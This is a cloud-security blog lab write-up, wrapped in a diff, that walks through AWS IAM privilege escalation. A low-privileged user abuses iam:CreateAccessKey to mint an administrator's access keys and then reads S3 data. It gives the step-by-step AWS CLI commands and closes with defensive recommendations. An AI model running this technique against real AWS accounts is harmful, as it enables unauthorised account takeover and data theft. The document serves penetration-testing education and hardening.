@@ -1,0 +1,189 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/cloud-security/" rel="category tag">Cloud Security</a></span>            </div>
+            <h1 class="post-title entry-title">AWS: IAM CreateAccessKey Privilege Escalation</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/aws-iam-createaccesskey-privilege-escalation/" rel="bookmark"><time class="entry-date published" datetime="2025-07-16T18:27:10+00:00">July 16, 2025</time><time class="updated" datetime="2025-07-16T20:51:18+00:00">July 16, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">While cloud providers are responsible for securing the cloud infrastructure, customers are accountable for securing everything they deploy in the cloud, including proper configurations. In this lab, we will show how a low-privileged IAM user can misuse the iam:CreateAccessKey permission where user is allowed to create access keys for another IAM user who can take on elevated roles, leading to privilege escalation. This setup highlights a common misconfiguration in IAM policies that can pose serious security risks.</span></p>
+<h3><span style="color: #800000;">Table Of Contents</span></h3>
+<p><span style="color: #000000;"><strong>About iam:CreateAccessKey</strong></span></p>
+<p><span style="color: #000000;"><strong>Lab Setup and Prerequisite</strong></span></p>
+<p><span style="color: #000000;"><strong>Part 1: IAM Lab Setup</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Creating High Privileged IAM User</span></li>
+<li><span style="color: #000000;">Creating Low Privileged IAM User</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Part 2: Enumeration and Exploitation</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Prerequisite for Pentest</span></li>
+<li><span style="color: #000000;">Configuring AWS CLI With Low Privileged User Credentials</span></li>
+<li><span style="color: #000000;">Enumerating IAM Users with AWS CLI</span></li>
+<li><span style="color: #000000;">IAM CreateAccessKey Exploitation</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Analysis</strong></span></p>
+<p><span style="color: #000000;"><strong>Recommendations </strong></span></p>
+<p><span style="color: #000000;"><strong>Conclusion</strong></span></p>
+<h3><span style="color: #800000;">About iam:CreateAccessKey</span></h3>
+<p><span style="color: #000000;">The <strong><span style="color: #0000ff;"><a style="color: #0000ff;" href="https://docs.aws.amazon.com/IAM/latest/APIReference/API_CreateAccessKey.html">iam:CreateAccessKey</a></span></strong> API action allows you to manage AWS account root user credentials. In AWS, <strong>“abusing the iam:CreateAccessKey permission” </strong>refers to a privilege escalation technique where a user with limited permissions <strong>creates access keys for another IAM user</strong>, typically one with higher privileges and then uses those keys to gain unauthorized access.</span></p>
+<p><span style="color: #000000;">The API action CreateAccessKey generates a <strong>new</strong> <strong>access key ID and secret </strong>for a specified IAM user or whoever is making the request.</span></p>
+<h3><span style="color: #800000;">Lab Setup and Prerequisites</span></h3>
+<ol>
+<li><span style="color: #000000;">An AWS Account</span></li>
+<li><span style="color: #000000;">VM Kali Linux</span></li>
+</ol>
+<p><span style="color: #000000;">If you are new to AWS platform, it is recommended to go through the AWS Lab setup <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.hackingarticles.in/aws-penetration-testing-lab-setup/">here</a></strong></span>,</span></p>
+<h3><span style="color: #800000;">Part 1: IAM Lab Setup</span></h3>
+<p><span style="color: #000000;">Here are the instructions for setting up the environment. We will access the AWS console and configure the AWS Command Line Interface (CLI) along with creation of IAM users and attaching  <strong><span style="color: #0000ff;"><a style="color: #0000ff;" href="https://docs.aws.amazon.com/IAM/latest/APIReference/API_CreateAccessKey.html">CreateAccessKey</a> </span></strong>policy.</span></p>
+<p><span style="color: #000000;"><strong>Users:</strong></span></p>
+<p><span style="color: #000000;"><strong>Igt_admin:</strong> High-level access</span></p>
+<p><span style="color: #000000;"><strong>Igt_raj:</strong> Basic access but with risky permissions</span></p>
+<p><span style="color: #000000;"><strong>Policy name:</strong></span></p>
+<p><span style="color: #000000;"><strong>Vuln_create_access_key:</strong> Lets user create access keys</span></p>
+<h4><span style="color: #800000;">Creating High Privileged IAM User</span></h4>
+<p><span style="color: #000000;">Navigate to <strong>IAM &gt; Users</strong>, then click <strong>Create user</strong> to set up a new IAM identity.</span></p>
+<ol>
+<li><span style="color: #000000;">Create the user a <strong>User name</strong> (e.g. lgt_admin) and press <strong>Next to set the permission.</strong></span></li>
+</ol>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh02cFZ7FE3rnZonBFYnnymPILruX9EEE-0EENPnLV3QnNcwT2sEqUiYJEoKcpZYH8QeEEhVVt-3foS_OiGmrFqlKftWhNScYV4d82JTvVHPH1rXSLG8p70UMQgDw0aQf2HJhFDFf8_OUM8ym-DPJPDgP5_SOLAaEIqkUXvQBV195IYeI9NdM8sKfjZ-JKe/s16000/1.png"/></span></p>
+<ol start="2">
+<li><span style="color: #000000;">Set permission to configure lgt_admin user’s permissions as <strong>Attach policies directly</strong> from the Permissions options.</span></li>
+<li><span style="color: #000000;">Select <strong>AdministratorAccess </strong>under Permission Policies section.</span></li>
+</ol>
+<p><span style="color: #000000;"><strong>AdministratorAccess – </strong>In AWS, the <strong>AdministratorAccess</strong> policy is a built-in policy that gives full access to all services and resources in the account when attached to a user, group, or role. Thus, making it the “high-privileged” target for the lab.</span></p>
+<p><span style="color: #000000;"><img fetchpriority="high" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg46f2zJZSL7uZQv07jtGcrTBRCb0kttcXBbc_7AzQC3v3fa14kDeu8n_kZtfin0uTQGq9NhCR0vKjryeM2hR9GiF2t2ONio-hzoTMmKe6KsOuD2YqPSzFa_8jTPMZ-YSo-4XeS501uX8JjGD1SL0-KEUKBuE-yLOrzgTBDpGTdLmZgmTCsE5krdW-9nP39/s16000/2.png" alt="AWS IAM CreateAccessKey Privilege Escalation" width="1287" height="532"/></span></p>
+<h4><span style="color: #800000;"> Creating low Privileged IAM User</span></h4>
+<ol>
+<li><span style="color: #000000;">Create <strong>another</strong> <strong>IAM user</strong> (e.g. lgt_raj) and press.</span></li>
+</ol>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiDxOCbMHjGEWTLcq1xLmi9WgTwmQkdTpQY1JlJqHMxPiJQF-AxH5fl2aD4xFwK8yRHeZY3F-qIBcCAJMOUMMgrJKi2M1O1-BQb9XeoiXVyVCuohN7ohvc7jLZwgLGTIpvfSZbPW1c_NN6dKQs9zqSZh0_voOcoGO0wD9BE5fC-K4KWvHDOTRVGgicV29Ip/s16000/3.png"/></span></p>
+<ol start="2">
+<li><span style="color: #000000;">Set permission to configure lgt_admin user’s permissions as Attach policies directly from the Permissions options.</span></li>
+<li><span style="color: #000000;">Now, select the Create Policy.</span></li>
+</ol>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg8KBpgWB9IX5lD4fNerc7MPeXIlszGClZ4HUPS2cb1rYY1A4nIoyLu9Xretg8KnmwGH9zLxLP6A7zZJdKmauKN1pCEKgF7ASdRKQ3xhMdf_nZGAcylMCE81GVPplF64H2Pl-rrrBr1KlWiooukwyFIfUb5A7Am46w6lMRr3vnv8pAA8RtgvkDrcuGAiRWd/s16000/4.png"/></span></p>
+<ol start="4">
+<li><span style="color: #000000;">Write a custom policy to provide certain action to IAM user Igt_raj.</span></li>
+</ol>
+<ul>
+<li><span style="color: #000000;"><strong>iam:CreateAccessKey</strong> – Allows creation of a new access key (AKIA/Secret) for a specified IAM user.</span></li>
+<li><span style="color: #000000;"><strong>iam:ListUsers</strong> – Lists all IAM users in the AWS account.</span></li>
+<li><span style="color: #000000;"><strong>iam:ListAttachedUserPolicies</strong> – Lists all managed policies attached to a specific IAM user.</span></li>
+<li><span style="color: #000000;"><strong>iam:GetUser</strong> – Retrieves details about a specified IAM user (or the caller if none specified).</span></li>
+<li><span style="color: #000000;"><strong>iam:GetPolicy</strong> – Retrieves metadata about a managed IAM policy.</span></li>
+<li><span style="color: #000000;"><strong>iam:GetPolicyVersion</strong> – Retrieves a specific version document of an IAM managed policy.</span></li>
+</ul>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">{
+              "Version": "2012-10-17",
+              "Statement": [
+                             {
+                                           "Effect": "Allow",
+                                           "Action": [
+                                                          "iam:CreateAccessKey",
+                                                          "iam:ListUsers",
+                                                          "iam:ListAttachedUserPolicies",
+                                                          "iam:GetUser",
+                                                          "iam:GetPolicy",
+                                                          "iam:GetPolicyVersion"
+                                           ],
+                                           "Resource": "*"
+                             }
+              ]
+}</pre>
+<p><span style="color: #000000;">This is how the policy looks like after adding certain actions.</span></p>
+<p><span style="color: #000000;"><img decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi-kfTr0liHEPBjjo2-VcUzQtCbcbHcdQWCda8YtKUMYDFWSIwwN6ClwOo0uVil9ohbbiAlkcUSCXl4h_-UpJk6i2YjL7HB8kBh2uCcHuzo1mhfgGzAjFjiMR0TlhM3FzRFpg2Inyqk6fS8hvFwtB_FQuDiET9gRH33GbsSz-p53Fl7kw0h26C6sd28pHRA/s16000/5.png" alt="AWS IAM CreateAccessKey Privilege Escalation" width="896" height="427"/></span></p>
+<ol start="5">
+<li><span style="color: #000000;">Provide policy details such as policy name (Vuln_create_access_key) and description as shown in the given screenshot.</span></li>
+</ol>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhNd_elNzDEOTGk5DHGuSKVfyH78gZTMHQUaDGwXjy7w8M7vzeYiflQqYDNAPVPQxzgau8FWbOm-rktabypLFHQZ0U4Yxvt0lZb_OxEiFg00npav7SurTlqwOZwKMFX1k8XaXnH2yeJ4MxEOrjNKIKLavaG1qjg5gmKEUffwOaiNulIujOiQ5ibWBzfEhl6/s16000/6.png"/></span></p>
+<ol start="6">
+<li><span style="color: #000000;">Map the policy “Vuln_create_access_key” for user Igt_raj .</span></li>
+</ol>
+<p><span style="color: #000000;"><img decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjcGdLQfbvw5PZs4isWrcO6R8hKIpbGuiFMOLDtvgCMRrE7XhEgnLFVfxpEz6O6PtSbp4Ask1Y9pGup7_9frAuDTE0dctg0Ez8xbUqvH0Lp9HVowDg4Sd3l156ZTM6_nEJQz7ZzeBBM9NznDVnCl3u7hVNrOlc0mbIjbWxpqKClRtEDDpa12ekQ1VJNcyru/s16000/7.png" alt="AWS IAM CreateAccessKey Privilege Escalation" width="1342" height="541"/></span></p>
+<ol start="7">
+<li><span style="color: #000000;">Lastly, let’s “<strong>Create access key</strong>” for Igt_raj. Select <strong>“Command Line Interface (CLI)”</strong> as the use case.</span></li>
+</ol>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjRSVZ5v3Qm-ktSAB1guOqQiPl5bcgS9ELMaUwvOw2v2MhRFUpS070QoIAmpiLVMNMvdaRb9vvBd-d0cLWKDRZ0Hq7kELxlnhvHz1tZBkHS4VgvyTWHkWfW4dlLgl5AZJTQoSECG9yoxnmnsbf4WLBKTrWNfPwSWbJk0yQNUpHc_cnWYiR6eiObaFPbTufh/s16000/8.png"/></span></p>
+<h3><span style="color: #800000;">Part 2: IAM Enumeration &amp; Exploitation</span></h3>
+<p><span style="color: #000000;"><strong>Why might the CreateAccesskey be used for another IAM user?</strong></span></p>
+<p><span style="color: #000000;">It is sometimes used to let a trusted user generate access keys for another IAM user in cases like</span></p>
+<ol>
+<li><span style="color: #000000;"><strong>Emergency access</strong> – when the admin is unavailable</span></li>
+<li><span style="color: #000000;"><strong>Break-glass situations</strong><strong> – </strong>for urgent recovery tasks</span></li>
+<li><span style="color: #000000;"><strong>Automation</strong> <strong>–</strong> in scripts that manage or rotate keys</span></li>
+</ol>
+<p><span style="color: #000000;"><strong>Note:</strong></span></p>
+<p><span style="color: #000000;">Letting users create access keys for others can lead to <strong>privilege escalation</strong>, is <strong>hard to track</strong>, and <strong>violates least privilege</strong>. It should be use with extreme caution.</span></p>
+<p><span style="color: #000000;">“We recommend relying on temporary credentials rather than creating long-term credentials such as access keys. Instead, use roles for temporary access.” <strong><span style="color: #0000ff;"><a style="color: #0000ff;" href="https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html">AWS IAM Best Practices</a></span></strong></span></p>
+<h4><span style="color: #800000;">Prerequisite for Pentest</span></h4>
+<ul>
+<li><span style="color: #000000;">Pentest Machine: Kali Linux</span></li>
+<li><span style="color: #000000;">Test Credentials: Igt_raj user’s Access Key + Secret + Region</span></li>
+<li><span style="color: #000000;">Tools: AWS-Cli (sudo apt install awscli)</span></li>
+</ul>
+<h4><span style="color: #800000;">Configuring AWS CLI With Low Privileged User Credentials</span></h4>
+<p><span style="color: #000000;">Configure AWS CLI profile with the Igt_raj credentials.</span></p>
+<p><span style="color: #000000;">It prompts to enter AWS Access Key ID, AWS Secret Access Key, default region.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">aws configure set profile.Igt_raj.aws_access_key_id &lt;rajUser_AccessKey&gt;
+aws configure set profile.Igt_raj.aws_secret_access_key &lt;rajUser_SecretKey&gt;
+aws configure set profile.Igt_raj.region us-east-1</pre>
+<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjsFDhOpk1xe_JmNLxAmTDbGHBwOIl2sLCXG3YibTLRReBeDLrmspMARzq7FMMok0BvzbUZmWxkfFuBuAUBKlS9PrqC6aeyWoB_LAiVxxEUufXgYBiPJJEoIxD8IFE2bN8FSdA7a82f_DgIhNJmJh7d757yIQf6OXgWqRwelnhXM1DX6XL1KIAgw6FbGP3p/s16000/9.png" alt="AWS IAM CreateAccessKey Privilege Escalation" width="1042" height="232"/></span></p>
+<p><span style="color: #000000;">Running the get-caller-identity command returns the profile details like user id and Arn. Pay close attention to the ARN, as it uniquely identifies the resource.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">aws sts get-caller-identity --profile Igt_raj</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEidowbyLdyyuOVsTa84eW2pvx14rY5_PCXg4gJJsA3iEBOC3isYPZq8j8DJMMscMldtVfa3cHhMvB1nGTAI98cCFQ4HtVSViAAyG58f5H6GxX5P4h2SiNvKCSpFuDJmauwSri2S_99iqeVtaw8OikNl5T_WVX3e2LFYI4AphKE3hhXLYlxDsoLvDIl4BbuE/s16000/10.png"/></span></p>
+<h4><span style="color: #800000;">Enumerating IAM Users with AWS CLI</span></h4>
+<p><span style="color: #000000;">Let’s begin the real game. Run the following command. It lists all IAM users in the AWS account.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">aws iam list-users --profile Igt_raj</pre>
+<p><span style="color: #000000;">Next, identify the attached policies. The following command shows that user Igt_raj has the CreateAccessKey policy attached, indicating a possible <strong>privilege escalation risk.</strong></span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">aws iam list-attached-user-policies --user-name Igt_raj --profile Igt_raj</pre>
+<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh8qjcwStl6RzBwcVaB9Fh54Ma1Ujbl6QHYK49EmKwq0DkBGruPj6s-vt9lnMCurUMLRtutRF5v3brwYRkIvyxmsYTmXRNhHB2_dgqNxYelFYKdKLeccSnVOms-eAAGcPXhyphenhyphenogDXfYowaHyWPqExG9vTI6aoxeNbTAuWIuwgOqqx9nOF9lo8oVM8UWev6-Y/s16000/11.png" alt="AWS IAM CreateAccessKey Privilege Escalation" width="995" height="749"/></span></p>
+<p><span style="color: #000000;">Use the following command to fetch policy metadata, including its ARN and default version ID (v2), indicating that the policy was updated and v2 should be analyzed for any analysis or exploitation.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">aws iam get-policy --policy-arn arn:aws:iam::513869214449:policy/Vuln_create_access_key --profile Igt_raj</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhPPsMhx_wVs55QUczRy-GZDhRl6W7y6ZyB7L_SM1a_QsQSt9z2KIy_LLmHrGZdb0sFRRFMa8ChKd_y7D16uAXUVHERYriDSyFdC74pi87WO-VJD4Pg0sr8VfMUVa2f6VV-v7cwacEw7IaLMHOn830XAW0PUMUsRvsnmBXshOXk02hCeloQsKPJnNkhdc25/s16000/12.png"/></span></p>
+<p><span style="color: #000000;">Running this command will show all the actions, effects and actual contents of policy.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">aws iam get-policy-version --policy-arn arn:aws:iam::513869214449:policy/Vuln_create_access_key --version-id v2 --profile Igt_raj</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgWNsGJ55uNXpEAfiPkDDRjaaMOFXoZSHSGvA8ikWadcTd126-DHixr0LJr_mP4R5sGNamke2-K1Hn6XzOCQJH7V_2SHqVH7hZ2I23dAPzktxzZGtJegkZhmn6Chd073X_lot1n0lZxm5kqYvlP5bex4QDWFiW1ex-bSk45HCK6bSu7U_xmojYJbpV2zIZ_/s16000/13.png"/></span></p>
+<h4><span style="color: #800000;">IAM CreateAccessKey Exploitation</span></h4>
+<p><span style="color: #000000;">Here, we will try to run the command.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">aws s3 ls --profile Igt_raj</pre>
+<p><span style="color: #000000;">The action will be denied as no identity-based policy can do it.</span></p>
+<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjFqzF7oyx8bl_4iFAGRlMjkWj8xfXpKDRVD9RhhA2mxqdE79sUV0eKtlncc5xVGqJGVOBiebQ8scCooKJCjEL_34oTMO7aufKHmovUspydnAlWwqDFhA7ca1jRGiVpqSMk-b9ufd3AjEBoE26y8nXTAuWIwJgtUwYAsGvWu6TRlmHxL7UFcQ9_PRXIQQ0G/s16000/14.png" alt="AWS IAM CreateAccessKey Privilege Escalation" width="1073" height="189"/></span></p>
+<p><span style="color: #000000;">Next, is the real exploitation of the CreateAccessKey policy. It requests the long-term credentials for the <strong>Igt_admin</strong> user.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">aws iam create-access-key --user-name Igt_admin –profile Igt_raj</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjL1xtSbQ-xj7QqmLwkhr-hACNf7wbOYYMaV82uYsW1cI9D14I2JgviaJnrVNTp65AMMHoMKnZBoq31LbHHn-OPDd54YnQgddTtQ6nnR06tB9NnhnW6WMyoaSC-ad67S9MNQdQN7YornKfUj6DIq-k-HFNhXnIZapxOokinIIeBSFpNPFXfRKiQhNX07ExD/s16000/15.png"/></span></p>
+<p><span style="color: #000000;">Now, we will setup our AWS CLI credentials according to the above output.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">aws configure</pre>
+<p><span style="color: #000000;">Again, use this command to check if its working and it’s a success this time.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">aws s3 ls</pre>
+<p><span style="color: #000000;">List your bucket and here you can see text files in output</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">aws s3 ls s3://igt-bucket</pre>
+<p><span style="color: #000000;">Download the text file</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">aws s3 cp s3://igt-bucket/proof.txt file_admin.txt</pre>
+<p><span style="color: #000000;">Display the contents of file</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cat file_admin.txt</pre>
+<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgOzi2T1Q-yZ1jOiV-RKxJ8lxtbXbsoXbR_qtcFa4O4Lg3KQxlqYTYte4MXL8t67qg2rG15U1ittbA7JusaE7LxfJ8Ziou8UioQOpMsF9Ipgm_MScgd548Bk0Js8Yul7TZhp8tr5PBJ08hyphenhyphen7nYUPsaiJTTYYPGU4Og05B9yNV7CncWqTOZjcbKrvbhMDDi_/s16000/16.png" alt="AWS IAM CreateAccessKey Privilege Escalation" width="1215" height="501"/></span></p>
+<h3><span style="color: #800000;">Analysis</span></h3>
+<p><span style="color: #000000;">This lab highlights a common security gap, overly permissive IAM policies that lack proper restrictions. Such setups can easily be exploited if not carefully reviewed and monitored. The escalation vector was:</span></p>
+<p><span style="color: #000000;"><strong>Igt_raj</strong> → list-users / get-user → have CreateAccessKey Permission → create-access-key on Admin User → Gets Admin Credentials → Configures CLI → <strong>Admin Access Gained</strong></span></p>
+<p><strong><span style="color: #000000;">Such misconfigurations can occur due to:</span></strong></p>
+<ul>
+<li><span style="color: #000000;">Overly permissive trust policies without resource restrictions (“<strong>Resource”: “*”</strong>)</span></li>
+<li><span style="color: #000000;">Improper role separation</span></li>
+<li><span style="color: #000000;">Violates Least Privilege Principle</span></li>
+</ul>
+<h3><span style="color: #800000;">Recommendations</span></h3>
+<ul>
+<li><span style="color: #000000;">Avoid giving users iam:CreateAccessKey on others unless absolutely required.</span></li>
+<li><span style="color: #000000;">Use <strong>temporary credentials</strong> with sts:AssumeRole</span></li>
+<li><span style="color: #000000;">Monitor key creation using <strong>AWS CloudTrail</strong> and set alerts.</span></li>
+<li><span style="color: #000000;">Use Service Control Policies (SCPs)</span></li>
+<li><span style="color: #000000;"><strong>Avoid wildcard permissions</strong>: Never use Resource: “*” in sensitive IAM policies</span></li>
+</ul>
+<h3><span style="color: #800000;">Conclusion</span></h3>
+<p><span style="color: #000000;">This lab successfully demonstrates a privilege escalation scenario in AWS using the iam:CreateAccessKey  and an overly permissive trust policy. It emphasizes the need for cautious and strict permission policies implementation in cloud environments.</span></p>
+<p><span style="color: #000000;">Explore more hands-on cloud security labs and techniques in our</span> <strong data-start="79" data-end="229" data-is-last-node=""><span style="color: #0000ff;"><a class="" style="color: #0000ff;" href="https://www.hackingarticles.in/category/cloud-security/" target="_new" rel="noopener" data-start="145" data-end="226">Cloud Security Archive</a></span>.</strong></p>
+<p><span style="color: #000000;"><strong>Author: Fatima Aziz</strong> is an accomplished cybersecurity professional with expertise in cloud security, holding certifications like GPCS and CCSK. Contact Fatima Aziz on <strong><span style="color: #0000ff;"><a style="color: #0000ff;" href="https://www.linkedin.com/in/fatimaaaziz/">LinkedIn</a></span></strong></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
